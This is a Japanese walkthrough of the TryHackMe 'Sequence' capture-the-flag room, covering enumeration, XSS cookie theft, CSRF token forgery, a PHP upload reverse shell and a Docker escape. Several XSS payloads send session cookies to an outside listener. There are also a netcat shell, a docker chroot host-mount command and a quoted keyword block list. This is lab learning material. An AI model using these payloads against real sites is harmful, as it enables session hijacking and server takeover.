# Sequence CTF

https://tryhackme.com/room/sequence

## Enumeration

```shell
TARGET=10.201.124.113
sudo bash -c "echo $TARGET   review.thm >> /etc/hosts"
```

### ポートスキャン

```sh
root@ip-10-201-47-204:~# nmap $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-20 00:32 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for review.thm (10.201.124.113)
Host is up (0.00048s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 16:FF:E0:27:BF:69 (Unknown)
```

```sh
root@ip-10-201-47-204:~# sudo nmap -sV -p80 --script vuln $TARGET
sudo: unable to resolve host ip-10-201-47-204: Name or service not known
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-20 00:42 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for review.thm (10.201.124.113)
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /login.php: Possible admin folder
|   /mail/: Mail folder
|   /phpmyadmin/: phpMyAdmin
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|     	PACKETSTORM:176334	9.8	https://vulners.com/packetstorm/PACKETSTORM:176334	*EXPLOIT*
|     	PACKETSTORM:171631	9.8	https://vulners.com/packetstorm/PACKETSTORM:171631	*EXPLOIT*
...
```

SSH, HTTPのみ。

### サブドメイン、VHOST

何も出ない。

```shell
$ ffuf -u http://review.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.review.thm' -fs 1694

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://review.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.review.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1694
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 117 req/sec :: Duration: [0:16:27] :: Errors: 0 ::
```

### ディレクトリ列挙

```sh
$ dirsearch -u http://review.thm          

[08:47:18] 302 -    0B  - /chat.php  ->  login.php                          
[08:47:24] 200 -  764B  - /contact.php                                      
[08:47:27] 302 -    1KB - /dashboard.php  ->  login.php                     
[08:47:28] 200 -    0B  - /db.php                                           
[08:47:46] 200 -  576B  - /header.php                                       
[08:47:53] 301 -  313B  - /javascript  ->  http://review.thm/javascript/    
[08:47:58] 200 -  747B  - /login.php                                        
[08:47:59] 302 -    0B  - /logout.php  ->  index.php                        
[08:48:00] 301 -  307B  - /mail  ->  http://review.thm/mail/                
[08:48:00] 200 -  450B  - /mail/                                            
[08:48:08] 200 -  357B  - /new.html                                         
[08:48:15] 301 -  313B  - /phpmyadmin  ->  http://review.thm/phpmyadmin/    
[08:48:18] 200 -    3KB - /phpmyadmin/                                      
[08:48:18] 200 -    3KB - /phpmyadmin/index.php                             
[08:48:18] 200 -    3KB - /phpmyadmin/doc/html/index.html
[08:48:34] 302 -    0B  - /settings.php  ->  login.php                      
[08:48:52] 301 -  310B  - /uploads  ->  http://review.thm/uploads/          
[08:48:52] 200 -  403B  - /uploads/
```

```sh
root@ip-10-201-13-125:~# cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt
root@ip-10-201-13-125:~# gobuster dir -q -x=txt,php,html -u http://review.thm -w ./dirlist.txt -t 64 -k
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/chat.php             (Status: 302) [Size: 0] [--> login.php]
/contact.php          (Status: 200) [Size: 2246]
/dashboard.php        (Status: 302) [Size: 1400] [--> login.php]
/db.php               (Status: 200) [Size: 0]
/header.php           (Status: 200) [Size: 1400]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 1694]
/javascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
/login.php            (Status: 200) [Size: 1944]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/mail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
/new.html             (Status: 200) [Size: 562]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
/server-status        (Status: 403) [Size: 275]
/settings.php         (Status: 302) [Size: 0] [--> login.php]
/uploads              (Status: 301) [Size: 310]
```

## contact

メッセージを送信すると、`Thank you for your feedback! Someone from our team will review it shortly.` と表示される。XSSを試す価値がある。  
HTTPヘッダーにCSPが設定されていないため、基本的に何でもいけそう。

```js
<script>document.write('<img src="http://10.11.146.32:8000/' + document.cookie + '">')</script>
```

セッションID入手成功。

```sh
$ python -m http.server                 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.124.113 - - [20/Sep/2025 09:00:57] code 404, message File not found
10.201.124.113 - - [20/Sep/2025 09:00:57] "GET /PHPSESSID=bp5tfjqjcmp2kukmup56smi774 HTTP/1.1" 404 -
10.201.124.113 - - [20/Sep/2025 09:00:57] code 404, message File not found
10.201.124.113 - - [20/Sep/2025 09:00:57] "GET /PHPSESSID=bp5tfjqjcmp2kukmup56smi774 HTTP/1.1" 404 -
```

devtoolでセッションIDを設定して、dashboard.php にログインできた。画面上部にフラグ1が表示されていた。

## chat

modユーザーとしてログインしているが、チャットのプロフィールにはAdminと表示されている。ダッシュボードのadminユーザーとの関係がよく分からず混乱する。

sqliの脆弱性は発見できなかった。

```sh
sqlmap -r chat.txt -p message --dbs --batch
```

SSTIを試したが効果なかった。

```
{{7*'7'}}
{{7*'7'}}
#{7*7}
{'Hello'|upper}
```

XSSを試したところ、`Your message contains suspicious content. Please remove it and try again.` と表示された。

```js
hello<script>document.write('<img src="http://10.11.146.32:8000/' + document.cookie + '">')</script>
```

XSSの危険判定がクライアント側スクリプトで実装されている。

```js
<script>
document.getElementById("chatForm").addEventListener("submit", function(e) {

    const msg = document.querySelector('input[name="message"]').value.toLowerCase();

    const dangerous = ["<script>", "</script>", "onerror", "onload", "fetch", "ajax", "xmlhttprequest", "eval", "document.cookie", "window.location"];

    for (let keyword of dangerous) {
        if (msg.includes(keyword)) {
            e.preventDefault();
            const modal = new bootstrap.Modal(document.getElementById("warningModal"));
            modal.show();
            break;
        }
    }
});
</script>
```

そもそもimgタグが文字列としてそのまま表示されているので、XSSは無理か？

```js
<img src=x onmouseover="this.src='http://10.11.146.32:8000/?c='+this['document']['cookie']">
```

## setting

Promote Co-Admin 機能で、次のリクエストが発行される。

```http
GET /promote_coadmin.php?username=mod&csrf_token_promote=ad148a3ca8bd0ef3b48c52454c493ec5 HTTP/1.1
Host: review.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Referer: http://review.thm/settings.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=bp5tfjqjcmp2kukmup56smi774
Connection: keep-alive
```

URLをチャットに入力したらadminが踏むかと思ったが、反応なかった。

## mail

/mail にテキストファイルがあった。

```
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert
```

内部ネットワークとのことで、SSRFが必要か？

## new.html

アクセスすると一瞬何かが表示されてから、promote_coadmin.phpに転送される。

```http
HTTP/1.1 200 OK
Date: Sat, 20 Sep 2025 02:30:05 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Thu, 05 Jun 2025 19:28:09 GMT
ETag: "232-636d81d222625-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 562
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Malicious Page</title>
    <script type="text/javascript">
        window.onload = function() {
           document.forms["attackForm"].submit();
        }
    </script>
</head>
<body>
    <p>If you are not redirected automatically, press the Submit button.</p>
    <form id="attackForm" action="http://review.thm/promote_coadmin.php" method="POST">
        <input type="hidden" name="username" value="mod" />
        <input type="submit" value="Submit"/>
    </form>
</body>
</html>
```

modユーザーにadmin権限を付けるためのものだが、どう利用できるのか？

/promote_coadmin.php で設定されているCSRFトークン`ad148a3ca8bd0ef3b48c52454c493ec5`は固定になっている。これは`mod`のMD5ハッシュであるため、`admin`のCSRFトークンもMD5ハッシュとして計算できる。

チャットに `http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3` というURLを送ると、modユーザーのロールがadminになった。

ダッシュボードで、`/lottery.php`を選択できるドロップダウンがある。Burpプロキシでインターセプトし、`/finance.php`に差し替えるとファイルアップロード機能が表示された。

任意のPHPをアップロードでき、finance.php の時と同様に、uploads/test.php にリクエストを差し替えるとPHPが実行された。

```sh
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.97.64] 41370
Linux 4f18a45cca05 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 GNU/Linux
sh: 1: w: not found
uid=0(root) gid=0(root) groups=0(root)
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Dockerエスケープ

イメージ一覧

```sh
# docker image ls
REPOSITORY      TAG       IMAGE ID       CREATED        SIZE
phpvulnerable   latest    d0bf58293d3b   3 months ago   926MB
php             8.1-cli   0ead645a9bc2   6 months ago   527MB
```

エスケープ成功

```sh
root@4f18a45cca05:/# docker run -v /:/mnt --rm -it phpvulnerable chroot /mnt sh

# ls -al
total 76
drwxr-xr-x  19 root root  4096 Sep 22 23:11 .
drwxr-xr-x  19 root root  4096 Sep 22 23:11 ..
-rw-r--r--   1 root root   166 Sep 22 23:11 .badr-info
lrwxrwxrwx   1 root root     7 Oct 26  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jul  9 18:57 boot
drwxr-xr-x  17 root root  3860 Sep 22 23:11 dev
drwxr-xr-x 113 root root  4096 Sep 22 23:11 etc
drwxr-xr-x   4 root root  4096 Jun  4 11:48 home
lrwxrwxrwx   1 root root     7 Oct 26  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Oct 26  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Oct 26  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Oct 26  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct 26  2020 lost+found
drwxr-xr-x   2 root root  4096 Oct 26  2020 media
drwxr-xr-x   2 root root  4096 Oct 26  2020 mnt
drwxr-xr-x   4 root root  4096 May 31 15:49 opt
dr-xr-xr-x 201 root root     0 Sep 22 23:10 proc
drwxr-x---  12 root root  4096 Jun  4 11:58 root
drwxr-xr-x  30 root root   960 Sep 22 23:11 run
lrwxrwxrwx   1 root root     8 Oct 26  2020 sbin -> usr/sbin
drwxr-xr-x   9 root root  4096 May 28 04:11 snap
drwxr-xr-x   2 root root  4096 Oct 26  2020 srv
dr-xr-xr-x  13 root root     0 Sep 22 23:10 sys
drwxrwxrwt  17 root root  4096 Sep 22 23:51 tmp
drwxr-xr-x  15 root root  4096 Nov 10  2021 usr
drwxr-xr-x  14 root root  4096 Nov 10  2021 var
```

## 振り返り

- CSRFトークンが変化しないことにもっと注意を払うべきだった。
- チャットのプロフィールで自分がAdminであるかのように表示されるのはイマイチな点だったと思う。かなり混乱した。
- 結局、new.html が何だったのかは不明。
